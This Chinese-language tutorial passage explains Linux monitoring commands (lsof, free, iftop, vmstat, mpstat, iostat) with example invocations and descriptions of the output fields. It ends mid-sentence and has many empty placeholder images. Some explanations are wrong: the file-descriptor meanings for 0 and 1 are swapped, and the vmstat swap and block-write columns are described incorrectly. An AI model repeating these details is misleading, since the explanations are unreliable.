    <content type="html"><![CDATA[<p>文档目录：</p><p>一、lsof：查看进程打开的文件</p><p>二、uptime：显示系统的运行时间及负载</p><p>三、free：查看系统内存信息</p><p>四、iftop：动态显示网络接口流量信息</p><p>五、vmstat：虚拟内存统计</p><p>六、mpstat：CPU信息统计</p><p>七、iostat：I/O信息统计</p><p>八、iotop：动态显示磁盘I/O统计信息</p><p>九、sar：收集系统信息</p><p>十、ntsysv：管理开机服务</p><p>十一、setup：系统管理工具</p><p>十二、ethtool：查看网卡参数</p><p>十三、mii-tool：管理网络接口的状态</p><p>十四、dmidecode：查询系统硬件信息</p><p>十五、ispci：显示所有PCI设备</p><p>十六、ipcs：显示进程间同信息设施的状态</p><p>十七、ipcrm：清除ipc相关信息</p><p>十八、rpm：RPM包管理器</p><p>十九、yum：自动化RPM包管理工具</p><p><strong>一、lsof：查看进程打开的文件</strong></p><p><strong>命令详解：</strong></p><p>lsof=list open files，列举系统中已经被打开的文件，根据文件可以找到对应的进程，也可以根据进程找到打开的文件</p><p><strong>1、显示使用文件的进程</strong></p><p>lsof /var/log/messages #显示使用文件的进程</p><p><img src="640.png" alt="图片"></p><p> COMMAND：命令，即进程名</p><p>PID：进程号</p><p>USER：进程的所有者 </p><p>FD：文件描述符，0-标准输出，1-标准输入，2-标准错误，u-文件被打开并处于读取/写入模式，r-表示该文件被打开并处于只读模式，w-表示该文件被打开并处于写入模式</p><p>TYPE：文件类型，REG(regular)为普通文件</p><p>DEVICE：磁盘的名称</p><p>SIZE/OFF：文件的大小</p><p>NODE：索引节点</p><p>NAME：文件名称</p><p><strong>2、指定进程所打开的文件</strong></p><p>lsof -c rsyslogd #指定进程所打开的文件</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> <strong>3、指定进程号所打开的文件</strong></p><p>lsof -p 57238 #指定进程号所打开的文件</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> <strong>4、监听指定的协议、端口和主机等信息，显示符合条件的进程信息。</strong></p><p>lsof -i #查看所有进程</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> lsof -i tcp #显示所有tcp网络连接的进程信息</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> lsof -i :22 #显示端口为22的进程，常用</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> lsof -i tcp:22 #显示同事满足TCP和端口22的进程</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> <strong>5、显示指定用户使用的文件</strong></p><p>lsof -u root #使用-u指定用户使用的文件</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> <strong>6、显示所有socket文件</strong></p><p>lsof -U #使用-U显示所有socket文件</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p><strong>二、uptime：显示系统的运行时间及负载</strong></p><p><strong>命令详解：</strong></p><p>输出当前的系统时间、系统开机到现在的运行时间、目前有多少用户在线和系统平均负载等信息</p><p><strong>1、uptime #显示系统运行时间及负载信息</strong></p><p><strong>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</strong></p><p><strong>三、free：查看系统内存信息</strong></p><p><strong>命令详解：</strong></p><p>free命令用于显示系统内存状态，具体包括系统物理内存、虚拟内存、共享内存和系统缓存等</p><p>total-代表内存总大小 </p><p>used-表示使用的实际内存大小</p><p>free-剩余物理内存大小（未分配、纯剩余）</p><p>share：共享内存大小、无需关注</p><p>buff/cache：缓冲（缓冲如：cpu到io硬盘，硬盘写入速度慢 需要先将一部分数据缓存到内存）和缓存（如：io硬盘到cpu，从硬盘读取 需要先把数据临时放内存里面 大小</p><p>available：实际可使用的内存大小；（free+buff/cache只分配，但未使用的内存）</p><p><strong>1、查看系统内存</strong></p><p>free #默认显示字节数</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> free -m #以MB为单位显示内存使用情况</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> free -h #根据实际大小自动转换成KB、GB、MB单位显示</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p>真实剩余内存=free+buff/cache=489M+317M=806M</p><p>换算关系：</p><p>total=used + free + buff/cache</p><p>available=free + buff/cache（分配但未使用的内存）</p><p>其中：used已使用内存，和buff/cache被占用的内存没有关系；</p><p> <strong>2、定时查询内存：</strong></p><p>free -h -s 10 #使用-s选项定时刷新内存的使用情况，单位为秒</p><p><img src="640-1689663845366-3.png" alt="图片"></p><p> <strong>四、iftop：动态显示网络接口流量信息</strong></p><p><strong>命令详解：</strong></p><p>iftop是一款实时流量监控工具，可用于监控TCP/IP连接等，必须用root用户身份运行。</p><p>安装方法参考：<a href="https://www.cnblogs.com/chaichuan/p/4442610.html">https://www.cnblogs.com/chaichuan/p/4442610.html</a></p><p><strong>1、不接受任务参数启动iftop命令监控流量</strong></p><p>iftop #默认监听第一块网卡，-i可以指定网卡</p><p><img src="640-1689663847090-6.png" alt="图片"></p><p> 界面上显示的类似刻度尺的刻度范围，是以标尺的形式显示流程图形的长条</p><p>中间的&lt;=或&gt;=两个箭头，表示的是流量的方向</p><p>TX：发送流量</p><p>RX：接收流量</p><p>TOTAL：总流量</p><p>Cum：运行iftop到目前时间的总流量</p><p>peak：流量峰值</p><p>rates：分别表示过去2s、10s、40s的平均流量</p><p><img src="640-1689663849145-9.png" alt="图片"></p><p> <strong>2、常用命令组合</strong></p><p>iftop -nNBP #-n不进行DNS解析，-N数字形式端口号，-P显示端口号，-B，以字节流为单位，默认为bit显示流量</p><p><img src="640-1689663851356-12.png" alt="图片"></p><p> <strong>五、vmstat：虚拟内存统计</strong></p><p><strong>命令详解：</strong></p><p>vmstat=virtual memory statistics，使用vmstat可以对操作系统的内存信息、进程状态和CPU活动等进行监视，但只能对系统的整体情况进行统计，无法对某个进程深入分析。</p><p><strong>1、显示虚拟内存的使用情况</strong></p><p>vmstat #省略-间隔时间与次数参数，仅显示一次报告后退出</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> vmstat 5 #表示每5秒更新一次输出信息，循环输出，ctrl+c退出</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> vmstat 5 6 #表示每5秒更新一次输出信息，统计6次后停止输出</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p>第1列：procs</p><p>r-运行和等待CPU时间片的进程数，b-正在等待资源的进程数</p><p>第2列：memory</p><p>swpd：表示使用虚拟内存的大小</p><p>free：表示当前空闲的物理内存数量</p><p>buff：表示buffers的内存数量</p><p>cache：表示cache的内存数量</p><p>第3列：swap</p><p>si(swap in)：列表示由磁盘调入内存，也就是内存进入内存交换区的数量</p><p>so(swap out)：列表示由内存调入磁盘，也就是内存交换区进入内存的数量</p><p>第4列：I/O项显示磁盘读写状况</p><p>bi列表示从块设备读入数据的总量(即读磁盘)（块/s）</p><p>bo列表示写入块设备数据的总量(即读磁盘)（块/s）</p><p>第5列：system显示采集间隔内发生的中断数</p><p>in列表示在某一时间间隔中观测到的每秒设备中断数</p><p>cs列表示每秒产生的上下文切换次数</p><p>第6列：CPU项显示了CPU的使用状态</p><p>us列显示了用户进程消耗的CPU时间百分比</p><p>sy列显示了系统（内核）进程消耗的cpu时间百分比</p><p>id列显示了CPU处在空闲状态的时间百分比</p><p>wa列显示了I/O等待所占用的CPU时间百分比</p><p>st列显示了虚拟机占用的CPU时间的百分比</p><p><strong>2、显示活跃和非活跃内存</strong></p><p>vmstat -a 2 5 #-a内容增加了inact与active选项，分别代表非活跃与活跃内存</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> <strong>3、查看内存使用的详细情况</strong></p><p>vmstat -s</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> <strong>4、查看磁盘的读/写</strong></p><p>vmstat -d</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> <strong>5、查看dev/sda1磁盘的读写</strong></p><p>vmstat -p /dev/sda1</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p>reads：来自该分区的读的次数</p><p>reads sectors：来自于该分区的读扇区的次数</p><p>writes：来自于该分区的写的次数</p><p>requested writes：来自于该分区的写请求的次数</p><p><strong>六、mpstat：CPU信息统计</strong></p><p><strong>命令详解：</strong></p><p>mpstat=multiprocessor statistics，一种实时监控工具，输出cpu的统计信息，存放在/proc/stat，可查询所有cpu平均信息， 也可以查特定的cpu信息</p><p>mpstat的最大特点：可以查看多核cpu中每个计算核心的统计数据，而vmstat只能查看系统整体的cpu情况</p><p><strong>1、显示cpu统计信息</strong></p><p>mpstat #省略-间隔时间与次数参数，仅显示一次报告后退出</p><p><img src="640-1689663854977-15.png" alt="图片"></p><p>mpstat 5 6 #表示每5秒更新一次输出信息，统计6次后停止输出</p><p><img src="640-1689663856937-18.png" alt="图片"></p><p> 第一列：当前时间</p><p>CPU：all表示所有cpu，0表示第一个cpu</p><p>%user：用户进程消耗的CPU时间（%）</p><p>%nice：nice值为负进程的CPU时间（%）</p><p> %sys 核心时间（%）</p><p>%iowait 硬盘IO等待时间（%）</p><p>%irq 硬中断时间（%）</p><p>%soft 软中断时间（%）</p><p>%steal 显示虚拟机管理器在服务另一个虚拟处理器时虚拟CPU处在非自愿等待下花费时间的百分比</p><p>%guest 显示运行虚拟处理器时CPU花费时间的百分比</p><p>%idle CPU除去等待磁盘IO操作外的因为任何原因而空闲的时间闲置时间（%）</p><p><strong>2、显示指定cpu信息的统计</strong></p><p>mpstat -P 0 #显示第一个cpu的信息</p><p><img src="640-1689663859106-21.png" alt="图片"></p><p><strong>七、iostat：I/O信息统计</strong></p><p><strong>命令详解：</strong></p><p>iostat=I/O statistics,主要功能是对系统磁盘I/O操作进行监控，它的输出主要是显示磁盘读写操作的统计信息，同时也会给出CPU的使用情况，同vmstat命令一样，不能对某个进程进行深入分析，仅对整体情况进行分析</p><p><strong>1、iostat #省略-间隔时间与次数参数，仅显示一次报告后退出</strong></p><p><img src="640-1689663860708-24.png" alt="图片"></p><p>%user：CPU处在用户模式下的时间百分比<br>%nice：CPU处在带NICE值的用户模式下的时间百分比<br>%system：CPU处在系统模式下的时间百分比<br>%iowait：CPU等待输入输出完成时间的百分比<br>%steal：管理程序维护另一个虚拟处理器时，虚拟CPU的无意识等待时间百分比<br>%idle：CPU空闲时间百分比</p><p>device:磁盘名称<br>tps:每秒钟发送到的I/O请求数<br>Blk_read/s:每秒读取的block数<br>Blk_wrtn/s:每秒写入的block数<br>Blk_read:读入的block总数<br>Blk_wrtn:写入的block总数</p><p><strong>2、定时显示所有信息</strong></p><p>iostat 2 3 #每2秒更新一次信息，共显示3次</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> <strong>3、只显示磁盘统计信息</strong></p><p>iostat -d</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p>iostat -d -k #-k以KB为单位显示数据</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> <strong>4、查看扩展信息</strong></p><p>iostat -d -x -k #-x显示扩展信息</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> rrqm/s: 每秒进行 merge 的读操作数目。即 rmerge/s</p><p>wrqm/s: 每秒进行 merge 的写操作数目。即 wmerge/s<br>r/s: 每秒完成的读 I/O 设备次数。即 rio/s<br>w/s: 每秒完成的写 I/O 设备次数。即 wio/s<br>rkB/s: 每秒读K字节数。是 rsect/s 的一半，因为每扇区大小为512字节。<br>wkB/s: 每秒写K字节数。是 wsect/s 的一半。<br>avgrq-sz: 平均每次设备I/O操作的数据大小 (扇区)。<br>avgqu-sz: 平均I/O队列长度。<br>rsec/s: 每秒读扇区数。即 rsect/s<br>wsec/s: 每秒写扇区数。即 wsect/s<br>r_await:每个读操作平均所需的时间<br>不仅包括硬盘设备读操作的时间，还包括了在kernel队列中等待的时间。<br>w_await:每个写操作平均所需的时间<br>不仅包括硬盘设备写操作的时间，还包括了在kernel队列中等待的时间。<br>await: 平均每次设备I/O操作的等待时间 (毫秒)。<br>svctm: 平均每次设备I/O操作的服务时间 (毫秒)。<br>%util: 一秒中有百分之多少的时间用于 I/O 操作，即被io消耗的cpu百分比</p><p>备注：如果 %util 接近 100%，说明产生的I/O请求太多，I/O系统已经满负荷，该磁盘可能存在瓶颈。如果 svctm 比较接近 await，说明 I/O 几乎没有等待时间；如果 await 远大于 